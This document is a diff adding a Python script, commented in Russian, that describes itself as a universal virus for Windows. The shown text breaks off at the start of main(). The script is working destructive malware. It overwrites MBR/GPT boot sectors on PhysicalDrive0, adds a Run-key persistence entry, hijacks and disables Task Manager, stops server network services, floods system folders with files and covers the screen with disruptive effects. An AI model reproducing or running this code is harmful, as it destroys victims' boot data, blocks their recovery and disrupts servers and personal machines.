@@ -1,0 +1,549 @@
+# universal_maksdv_bomb.py
+# Универсальный вирус для всех версий Windows включая Server 2025
+
+import os
+import sys
+import random
+import time
+import threading
+import subprocess
+import ctypes
+from ctypes import wintypes, c_ulong, c_void_p, c_char_p, Structure, POINTER, byref
+import struct
+import math
+import platform
+import winreg
+from datetime import datetime
+
+# Универсальные константы Windows API
+GENERIC_READ = 0x80000000
+GENERIC_WRITE = 0x40000000
+OPEN_EXISTING = 3
+FILE_SHARE_READ = 0x00000001
+FILE_SHARE_WRITE = 0x00000002
+INVALID_HANDLE_VALUE = -1
+
+# Загрузка системных библиотек
+try:
+    kernel32 = ctypes.windll.kernel32
+    gdi32 = ctypes.windll.gdi32
+    user32 = ctypes.windll.user32
+    advapi32 = ctypes.windll.advapi32
+    shell32 = ctypes.windll.shell32
+except Exception as e:
+    print(f"API load error: {e}")
+
+class RECT(Structure):
+    _fields_ = [
+        ("left", ctypes.c_long),
+        ("top", ctypes.c_long),
+        ("right", ctypes.c_long),
+        ("bottom", ctypes.c_long)
+    ]
+
+class UniversalMaksDVBomb:
+    def __init__(self):
+        self.running = True
+        self.windows_version = self.detect_windows_version()
+        self.is_server = "server" in self.windows_version.lower()
+        
+        # Эффекты для разных версий Windows
+        self.effects = [
+            self.matrix_effect_universal,
+            self.rainbow_wave_universal,
+            self.pixel_chaos_universal,
+            self.spiral_madness_universal,
+            self.text_bombardment_universal,
+            self.windows_logo_corruption,
+            self.blue_screen_simulation
+        ]
+        
+        # Сообщения для разных версий
+        self.messages = {
+            'common': [
+                "MAKSDV BOMB ACTIVATED", "SYSTEM DESTROYED", "MBR/GPT CORRUPTED",
+                "WINDOWS KILLED", "MAKSDV WAS HERE", "BOOT FAILURE IMMINENT",
+                "SERVER COMPROMISED", "ADMIN PRIVILEGES OBTAINED", "FATAL ERROR",
+                "CRITICAL SYSTEM DAMAGE", "OPERATING SYSTEM TERMINATED"
+            ],
+            'server': [
+                "SERVER 2025 DESTROYED", "ACTIVE DIRECTORY CORRUPTED",
+                "DOMAIN CONTROLLER COMPROMISED", "SQL DATABASES ERASED",
+                "IIS SERVICES TERMINATED", "HYPER-V VIRTUALIZATION KILLED"
+            ],
+            'client': [
+                "WINDOWS 11 DESTROYED", "DESKTOP COMPROMISED",
+                "PERSONAL DATA ERASED", "GAMING RIG TERMINATED"
+            ]
+        }
+    
+    def detect_windows_version(self):
+        """Определение версии Windows"""
+        try:
+            return f"{platform.system()} {platform.release()} {platform.version()}"
+        except:
+            return "Windows Unknown Version"
+    
+    def is_admin(self):
+        """Проверка прав администратора универсальным способом"""
+        try:
+            if os.name == 'nt':
+                return ctypes.windll.shell32.IsUserAnAdmin() != 0
+            return False
+        except:
+            return False
+    
+    def create_cmd_windows_universal(self):
+        """Создание командных окон для всех версий Windows"""
+        cmd_templates = [
+            'cmd.exe /k echo бомба от maksdv активирована && title MAKSDV BOMB && color 0C && echo SYSTEM COMPROMISED',
+            'powershell.exe -Command "Write-Host \\"бомба от maksdv активирована\\" -ForegroundColor Red; while($true) { Start-Sleep 1 }"',
+            'pwsh.exe -Command "Write-Host \\"MAKSDV BOMB ACTIVE\\" -ForegroundColor Red"'
+        ]
+        
+        for i in range(15):
+            try:
+                cmd = random.choice(cmd_templates)
+                if self.is_server:
+                    # Дополнительные команды для серверов
+                    server_cmds = [
+                        'servermanagercmd.exe',
+                        'dism.exe /online /cleanup-image /restorehealth',
+                        'sfc /scannow'
+                    ]
+                    cmd = random.choice(server_cmds)
+                
+                creation_flags = 0x08000000  # CREATE_NO_WINDOW для скрытия
+                subprocess.Popen(cmd, shell=True, creationflags=creation_flags)
+                time.sleep(0.3)
+            except Exception as e:
+                continue
+    
+    def destroy_mbr_gpt_universal(self):
+        """Универсальное разрушение MBR/GPT для всех Windows"""
+        try:
+            # Пытаемся разные методы доступа к диску
+            drive_paths = [
+                "\\\\.\\PhysicalDrive0",
+                "\\\\.\\Harddisk0",
+                "\\\\.\\BootPartition"
+            ]
+            
+            for drive_path in drive_paths:
+                try:
+                    drive_handle = kernel32.CreateFileW(
+                        drive_path,
+                        GENERIC_READ | GENERIC_WRITE,
+                        FILE_SHARE_READ | FILE_SHARE_WRITE,
+                        None,
+                        OPEN_EXISTING,
+                        0,
+                        None
+                    )
+                    
+                    if drive_handle != INVALID_HANDLE_VALUE:
+                        # Создаем универсально поврежденные данные
+                        corrupted_data = self.generate_corrupted_boot_data()
+                        
+                        # Записываем в разные области диска
+                        sectors_to_corrupt = [0, 1, 2, 3, 2048, 4096]  # MBR, GPT, Backup GPT
+                        
+                        for sector in sectors_to_corrupt:
+                            try:
+                                kernel32.SetFilePointer(drive_handle, sector * 512, None, 0)
+                                bytes_written = wintypes.DWORD()
+                                kernel32.WriteFile(
+                                    drive_handle,
+                                    corrupted_data,
+                                    512,
+                                    byref(bytes_written),
+                                    None
+                                )
+                            except:
+                                continue
+                        
+                        kernel32.CloseHandle(drive_handle)
+                        break
+                        
+                except:
+                    continue
+                    
+        except Exception as e:
+            pass
+    
+    def generate_corrupted_boot_data(self):
+        """Генерация универсально поврежденных загрузочных данных"""
+        corrupted_data = bytearray(512)
+        
+        # Универсальное сообщение
+        message = "MAKSDV UNIVERSAL BOMB - BOOT DESTROYED"
+        message_bytes = message.encode('utf-16-le')
+        
+        # Записываем сообщение в разных местах
+        positions = [0, 64, 128, 256, 384]
+        for pos in positions:
+            if pos + len(message_bytes) < 512:
+                corrupted_data[pos:pos + len(message_bytes)] = message_bytes
+        
+        # Повреждаем критичные структуры
+        corrupted_data[510] = 0x00  # Убираем MBR сигнатуру
+        corrupted_data[511] = 0x00
+        corrupted_data[440:446] = b'\xFF' * 6  # Повреждаем disk signature
+        
+        return bytes(corrupted_data)
+    
+    def matrix_effect_universal(self, hdc, width, height):
+        """Универсальный матричный эффект"""
+        chars = ['0', '1', 'MAKSDV', 'BOMB', 'WIN', 'SERVER', '2025']
+        
+        for i in range(800):
+            x = random.randint(0, width - 1)
+            y = random.randint(0, height - 1)
+            char = random.choice(chars)
+            color = 0x0000FF00  # Зеленый
+            
+            try:
+                gdi32.SetTextColor(hdc, color)
+                gdi32.SetBkColor(hdc, 0x00000000)
+                gdi32.TextOutW(hdc, x, y, char, len(char))
+            except:
+                pass
+            
+            if i % 100 == 0:
+                time.sleep(0.01)
+    
+    def rainbow_wave_universal(self, hdc, width, height):
+        """Универсальная радужная волна"""
+        colors = [0x000000FF, 0x0000FF00, 0x00FF0000, 0x00FFFF00, 0x00FF00FF, 0x0000FFFF]
+        
+        for frame in range(30):
+            color = colors[frame % len(colors)]
+            
+            try:
+                brush = gdi32.CreateSolidBrush(color)
+                
+                for i in range(30):
+                    left = random.randint(0, width)
+                    top = random.randint(0, height)
+                    right = left + random.randint(100, 300)
+                    bottom = top + random.randint(100, 300)
+                    
+                    rect = RECT(left, top, right, bottom)
+                    gdi32.FillRect(hdc, byref(rect), brush)
+                
+                gdi32.DeleteObject(brush)
+            except:
+                pass
+            
+            time.sleep(0.1)
+    
+    def pixel_chaos_universal(self, hdc, width, height):
+        """Универсальный пиксельный хаос"""
+        for i in range(30000):
+            x = random.randint(0, width - 1)
+            y = random.randint(0, height - 1)
+            
+            def RGB(r, g, b):
+                return r | (g << 8) | (b << 16)
+            
+            color = RGB(
+                random.randint(0, 255),
+                random.randint(0, 255), 
+                random.randint(0, 255)
+            )
+            
+            try:
+                gdi32.SetPixel(hdc, x, y, color)
+            except:
+                pass
+            
+            if i % 1000 == 0:
+                time.sleep(0.01)
+    
+    def spiral_madness_universal(self, hdc, width, height):
+        """Универсальное спиральное безумие"""
+        center_x, center_y = width // 2, height // 2
+        
+        for angle in range(0, 1800, 3):
+            rad = angle * math.pi / 180
+            radius = angle / 8
+            
+            x = center_x + int(radius * math.cos(rad))
+            y = center_y + int(radius * math.sin(rad))
+            
+            def RGB(r, g, b):
+                return r | (g << 8) | (b << 16)
+            
+            color = RGB(
+                angle % 255,
+                (angle + 85) % 255,
+                (angle + 170) % 255
+            )
+            
+            try:
+                pen = gdi32.CreatePen(0, 1, color)
+                old_pen = gdi32.SelectObject(hdc, pen)
+                
+                if angle == 0:
+                    gdi32.MoveToEx(hdc, center_x, center_y, None)
+                gdi32.LineTo(hdc, x, y)
+                
+                gdi32.SelectObject(hdc, old_pen)
+                gdi32.DeleteObject(pen)
+            except:
+                pass
+    
+    def text_bombardment_universal(self, hdc, width, height):
+        """Универсальная текстовая бомбардировка"""
+        all_messages = self.messages['common']
+        if self.is_server:
+            all_messages.extend(self.messages['server'])
+        else:
+            all_messages.extend(self.messages['client'])
+        
+        for i in range(150):
+            message = random.choice(all_messages)
+            x = random.randint(0, width - 200)
+            y = random.randint(0, height - 50)
+            
+            def RGB(r, g, b):
+                return r | (g << 8) | (b << 16)
+            
+            color = RGB(
+                random.randint(0, 255),
+                random.randint(0, 255),
+                random.randint(0, 255)
+            )
+            
+            try:
+                gdi32.SetTextColor(hdc, color)
+                gdi32.SetBkMode(hdc, 1)  # Transparent
+                
+                font_size = random.randint(16, 48)
+                font = gdi32.CreateFontW(
+                    font_size, 0, 0, 0, 700, 0, 0, 0,
+                    0, 0, 0, 0, 0, "Arial"
+                )
+                
+                old_font = gdi32.SelectObject(hdc, font)
+                gdi32.TextOutW(hdc, x, y, message, len(message))
+                gdi32.SelectObject(hdc, old_font)
+                gdi32.DeleteObject(font)
+            except:
+                pass
+            
+            time.sleep(0.05)
+    
+    def windows_logo_corruption(self, hdc, width, height):
+        """Коррупция логотипа Windows"""
+        colors = [0x000000FF, 0x0000FF00, 0x00FF0000]  # Красный, зеленый, синий
+        
+        for i in range(10):
+            try:
+                # Рисуем искаженный логотип Windows
+                center_x, center_y = width // 2, height // 2
+                size = min(width, height) // 3
+                
+                for j in range(4):  # 4 квадрата как в лого Windows
+                    color = colors[j % len(colors)]
+                    brush = gdi32.CreateSolidBrush(color)
+                    
+                    # Случайное смещение для коррупции
+                    offset_x = random.randint(-50, 50)
+                    offset_y = random.randint(-50, 50)
+                    
+                    left = center_x - size//2 + j * size//4 + offset_x
+                    top = center_y - size//2 + offset_y
+                    right = left + size//2 + random.randint(-20, 20)
+                    bottom = top + size//2 + random.randint(-20, 20)
+                    
+                    rect = RECT(left, top, right, bottom)
+                    gdi32.FillRect(hdc, byref(rect), brush)
+                    gdi32.DeleteObject(brush)
+                
+                time.sleep(0.5)
+            except:
+                pass
+    
+    def blue_screen_simulation(self, hdc, width, height):
+        """Симуляция синего экрана смерти"""
+        try:
+            # Синий фон
+            blue_brush = gdi32.CreateSolidBrush(0x00FF0000)  # Синий
+            screen_rect = RECT(0, 0, width, height)
+            gdi32.FillRect(hdc, byref(screen_rect), blue_brush)
+            gdi32.DeleteObject(blue_brush)
+            
+            # Белый текст
+            gdi32.SetTextColor(hdc, 0x00FFFFFF)
+            gdi32.SetBkColor(hdc, 0x00FF0000)
+            
+            # Сообщение об ошибке
+            error_messages = [
+                "CRITICAL_PROCESS_DIED",
+                "SYSTEM_THREAD_EXCEPTION_NOT_HANDLED",
+                "KERNEL_SECURITY_CHECK_FAILURE",
+                "DRIVER_IRQL_NOT_LESS_OR_EQUAL"
+            ]
+            
+            font = gdi32.CreateFontW(
+                24, 0, 0, 0, 400, 0, 0, 0,
+                0, 0, 0, 0, 0, "Lucida Console"
+            )
+            old_font = gdi32.SelectObject(hdc, font)
+            
+            for i, msg in enumerate(error_messages):
+                gdi32.TextOutW(hdc, 100, 100 + i * 30, msg, len(msg))
+            
+            bsod_msg = "Your PC ran into a problem and needs to restart."
+            gdi32.TextOutW(hdc, 100, 300, bsod_msg, len(bsod_msg))
+            
+            stop_code = f"Stop code: {random.choice(['CRITICAL_PROCESS_DIED', 'SYSTEM_SERVICE_EXCEPTION'])}"
+            gdi32.TextOutW(hdc, 100, 350, stop_code, len(stop_code))
+            
+            gdi32.SelectObject(hdc, old_font)
+            gdi32.DeleteObject(font)
+            
+            time.sleep(3)
+        except:
+            pass
+    
+    def system_chaos_universal(self):
+        """Универсальный системный хаос"""
+        time.sleep(15)  # Задержка перед началом хаоса
+        
+        # Реестровый хаос
+        self.registry_chaos()
+        
+        # Файловый хаос
+        self.file_system_chaos()
+        
+        # Сетевой хаос (для серверов)
+        if self.is_server:
+            self.network_chaos()
+    
+    def registry_chaos(self):
+        """Хаос в реестре"""
+        try:
+            reg_entries = [
+                (winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "MAKSDV_Bomb", os.path.abspath(sys.argv[0])),
+                (winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options", "taskmgr.exe", "Debugger"),
+                (winreg.HKEY_CURRENT_USER, "Control Panel\\Desktop", "Wallpaper", ""),
+                (winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", 1),
+            ]
+            
+            for hkey, subkey, value_name, value_data in reg_entries:
+                try:
+                    key = winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE)
+                    if isinstance(value_data, int):
+                        winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, value_data)
+                    else:
+                        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, value_data)
+                    winreg.CloseKey(key)
+                except:
+                    pass
+                    
+        except Exception as e:
+            pass
+    
+    def file_system_chaos(self):
+        """Хаос в файловой системе"""
+        temp_dirs = [
+            os.environ.get('TEMP', 'C:\\Windows\\Temp'),
+            os.environ.get('TMP', 'C:\\Windows\\Temp'),
+            "C:\\Windows\\Temp",
+            "C:\\Users\\Public",
+            "C:\\ProgramData"
+        ]
+        
+        for temp_dir in temp_dirs:
+            if os.path.exists(temp_dir):
+                try:
+                    for i in range(50):
+                        filename = os.path.join(temp_dir, f"maksdv_bomb_{i}_{random.randint(1000,9999)}.txt")
+                        with open(filename, 'w', encoding='utf-8') as f:
+                            f.write("бомба от maksdv активирована\n" * 100)
+                            f.write(f"Windows Version: {self.windows_version}\n")
+                            f.write(f"Timestamp: {datetime.now()}\n")
+                except:
+                    pass
+    
+    def network_chaos(self):
+        """Сетевой хаос для серверов"""
+        if not self.is_server:
+            return
+            
+        try:
+            # Останавливаем сетевые службы
+            services = ["Spooler", "LanmanServer", "LanmanWorkstation", "Netlogon"]
+            for service in services:
+                try:
+                    subprocess.Popen(f"net stop {service} /y", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                except:
+                    pass
+        except:
+            pass
+    
+    def gdi_effects_thread(self):
+        """Поток с GDI эффектами"""
+        try:
+            hdc = user32.GetDC(0)
+            width = user32.GetSystemMetrics(0)
+            height = user32.GetSystemMetrics(1)
+            
+            while self.running:
+                effect = random.choice(self.effects)
+                try:
+                    effect(hdc, width, height)
+                except Exception as e:
+                    pass
+                
+                time.sleep(2)
+            
+            user32.ReleaseDC(0, hdc)
+        except:
+            pass
+    
+    def start_universal_attack(self):
+        """Запуск универсальной атаки"""
+        print("бомба от maksdv активирована")
+        print(f"Target: {self.windows_version}")
+        print("Universal Windows Bomb - Server/Client Compatible")
+        
+        # Запускаем эффекты
+        gdi_thread = threading.Thread(target=self.gdi_effects_thread)
+        gdi_thread.daemon = True
+        gdi_thread.start()
+        
+        # Запускаем системный хаос
+        chaos_thread = threading.Thread(target=self.system_chaos_universal)
+        chaos_thread.daemon = True
+        chaos_thread.start()
+        
+        # Создаем командные окна
+        self.create_cmd_windows_universal()
+        
+        # Основной цикл атаки
+        attack_phases = [
+            (10, "Phase 1: GDI Effects"),
+            (20, "Phase 2: System Chaos"), 
+            (30, "Phase 3: MBR/GPT Destruction"),
+            (40, "Phase 4: Final Demolition")
+        ]
+        
+        for delay, phase in attack_phases:
+            time.sleep(delay)
+            print(phase)
+            self.create_cmd_windows_universal()
+        
+        # Финальное разрушение
+        print("FINAL: Destroying boot sectors...")
+        self.destroy_mbr_gpt_universal()
+        
+        # Бесконечный цикл
+        while True:
+            self.create_cmd_windows_universal()
+            time.sleep(5)
+
+def main():
+    """Универсал
